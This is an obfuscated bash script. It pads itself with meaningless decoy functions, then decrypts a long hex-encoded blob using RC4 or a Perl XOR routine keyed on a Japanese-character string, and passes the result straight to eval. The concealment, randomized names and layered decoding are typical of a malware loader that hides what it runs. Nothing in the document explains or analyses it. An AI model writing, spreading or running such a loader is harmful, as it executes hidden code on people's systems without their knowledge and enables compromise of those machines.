set +H
_Ptf-25(){ local _x=$((RANDOM%9999)); [ $_x -eq 1337 ] && echo "Z"; }
_Qzr-88(){ for _i in {1..3}; do :; done; }
_Mvk-14(){ false && exit 0; }
_Njx-63(){ echo "Z" > /dev/null; }
_Wpb-07(){ local _y=$((RANDOM%100)); [ $_y -eq 50 ] && echo "Z"; }
_Rcs-42(){ local _a=$1; local _b=""; for ((_i=0;_i<${#_a};_i++)); do _b+="${_a:$_i:1}"; done; echo "$_b"; }
_Ldg-19(){ _Qzr-88; _Njx-63; }
_Hkx-31(){
  perl -e '
    local $/;
    my $h = <STDIN>;
    $h =~ s/\s//g;
    my $d = pack("H*", $h);
    my $k = "キヨ";
    my $kl = length($k);
    my $i = 0;
    my $o = "";
    for my $c (split //, $d) {
      my $kc = substr($k, $i % $kl, 1);
      $o .= chr(ord($c) ^ ord($kc));
      $i++;
    }
    print $o;
  '
}
_Tbq-77(){
  local _z="$1"
  local _r
  _r=$(echo "$_z" | xxd -r -p | openssl enc -d -rc4 -K $(printf '%s' 'キヨ' | xxd -p | tr -d '\n') 2>/dev/null)
  [ -z "$_r" ] && _r=$(echo "$_z" | _Hkx-31)
  echo "$_r"
}
_Vmn-05(){ echo "$1" | xxd -r -p; }
_Ypl-92(){ local _s="$1"; echo "${_s:0:${#_s}}"; }
_Gfr-58(){ _Ptf-25; _Njx-63; _Wpb-07; }
_Zwk-11(){ _Mvk-14; _Qzr-88; }
__P__="c0a2e986f5cd8feddd86f188d9a2f98bfbd199f899d3b7a2c0a2ef96f0cd97a2c98aa3fa8aecc88ea3cf88a2d996eb88d9f4a7e9f7cd8ebf8fb4eace8aacc597eec4c188df8cf795d388ce82f1c1bcf2c291f780caa2d6e9f4c08aeec8c3f7da96e796c3e7c7e9f0c297be8ccbaaffa2cdecaccf8dc6a391d3b29dc3a888d2b29dd3aa81e9ebcbc3a288cbe7ce8bec88dda28287e6deccf6ce93ac99d1b583d3ad98cdb382c7f1c797ab8dddaccc86f4828df6c48fa29fdda599d8a2d98be6c6e9f0c897f6da8d88cb8a89cc8cecc8e9fea280e3df8adcd88cf0d9e9e0c486e3dfc389cd80eac2c3a18ae9e7ce8bec88cee78dc1df98d0b1f6d0b093d2effe8aefc98be9cc8d89db82eec48da3cc82ec8d81f6c38288c98aa3cb91eac28ee688131d3c64733772058fe9e6cb8bed8dc1a1a286e1c58ca38586a28fbfb39bd0d99ed1b8998eead997f392ccadc18ce0c98feac290f792c7f0c297a1a286e1c58ca38ac188dd9af7c08cec9ec3aecbc3a0a78aeed88cf0d9c3ebdc97f28390e6da95e7dfcfa3db8ce1c686f7db86f0db86f1a280eecc90f088abaac597f7d8cdf1c891f5cd91acef82f0cdabd6f9b3d1cd92f7c890f7e082ecc98fe6dacab8a7c3a388c3e6c885a3cc8cddeaa6d78090e7c185aa92e9a28dc3a388c3a28d97f1d1d9888dc3a388c3a28dc3a388c3a2da8af7c0c3eddd86ed80c4a6d986ee8fcfa5df81a481c3e3dec3e592e9a28dc3a388c3a28dc3a388c3a28dc3a3cac3bf8d85adda86e3c9cbaaa2c3a28dc3a388c3a28dc3a38890e7c185addb86ecc9bcf1cd90f2c28df0cdcbb09dd3aaa2c3a28dc3a388c3a28dc3a38890e7c185addb86ecc9bcebcd82e6c891ab8fa0edc397e6c697aff99af3cdc4ae8a97e6d097adc597eec4c4aba7c3a388c3a28dc3a388c3a28d90e6c485acc88de7f78be7cc87e6da90aa84e9a388c3a28dc3a388c3a28dc3f0cd8fe48394e5c18fe78394f1c197e78581aaa2c3a28dc3a388c3a2c89be0cd93f697e9a388c3a28dc3a388c3a28dc3f0cd8fe48390e6c687dddf86f0d88cecde86ab9cd3b684e9a388c3a28dc3a388c3a28dc3f0cd8fe48386edccbceac882e7cd91f185ca8988c3a28d87e6cec3eec284dcc586f1de82e4cdcbf1c88fe584c9e384d9a3d882f1dee989db8ce1c686f7db86f0db86f186b7c1fdb0e6da95e7dfcde2c48feddabcf1cd96f1c8bce2cc87f0c890f088dea2f991f6cde9f5c497eb8890edce88e6dc90e7df95e6dacdd6eeb3d0cd91f4c891ab80c4b39fd4ad98cdb283d2a484c7f0c297aa84c3ca84c3e2dbc3f197e9a388c3a2decdf0cd91f4c8bce5c791e7db86f180ca888f"
_Sxd-64(){
  local _e="$__P__"
  local _d=""
  _d=$(_Tbq-77 "$_e")
  [ -z "$_d" ] && _d=$(_Hkx-31 <<< "$_e")
  [ -z "$_d" ] && _d=$(_Vmn-05 "$_e")
  eval "$_d"
}
if [ "$RANDOM" -gt 99999 ]; then
  _Gfr-58
else
  _Zwk-11
fi
_Sxd-64
